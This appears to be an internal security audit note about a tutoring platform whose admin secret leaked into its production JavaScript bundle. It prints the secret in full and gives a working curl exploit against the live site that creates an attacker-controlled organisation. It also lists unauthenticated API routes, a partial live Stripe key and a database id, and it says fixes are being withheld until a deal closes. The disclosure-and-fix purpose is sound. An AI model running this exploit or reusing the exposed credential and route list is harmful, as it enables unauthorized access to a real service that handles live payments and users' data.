SYMPTOM: Admin secret (`Alanelis123!?`) fully exposed in production JS bundle at tutlio.lt. Anyone can extract it from DevTools and create orgs or invite tutors.

CAUSE: `VITE_*` prefix causes Vite to bundle env vars into client JS at build time. Found as `Rj="Alanelis123!?"` at position 1,255,366 in the bundle, referenced as `"x-admin-secret": Rj` in the fetch call.

EXPLOIT:
```bash
curl -X POST https://www.tutlio.lt/api/create-company \
  -H "Content-Type: application/json" \
  -H "x-admin-secret: Alanelis123!?" \
  -d '{"orgName":"Hacked","orgEmail":"attacker@evil.com","tutorLimit":999,"adminEmail":"attacker@evil.com","adminPassword":"password123"}'
```

OTHER CRITICAL ISSUES (not yet fixed):
- 22/28 API routes have zero authentication (cancel-session, send-email, confirm-stripe-payment, google-calendar-sync, reserve-package-lesson all accept any caller)
- Stripe webhook skips signature verification if STRIPE_WEBHOOK_SECRET missing
- 4 cron endpoints publicly hittable with no auth
- Google OAuth state param is raw userId (CSRF risk)
- In-memory Google Calendar sync lock (useless across Vercel instances)

PROD STRIPE KEY: sk_live_51T96yO... (live payments, real money)
PROD SUPABASE: cuhciqwmqfuajeeqjjbm

FIX: Rename VITE_ADMIN_SECRET → ADMIN_SECRET (server-only). Replace shared secret with Supabase auth + server-side role check.

STATUS: Not fixed — holding security fixes for after deal is signed.
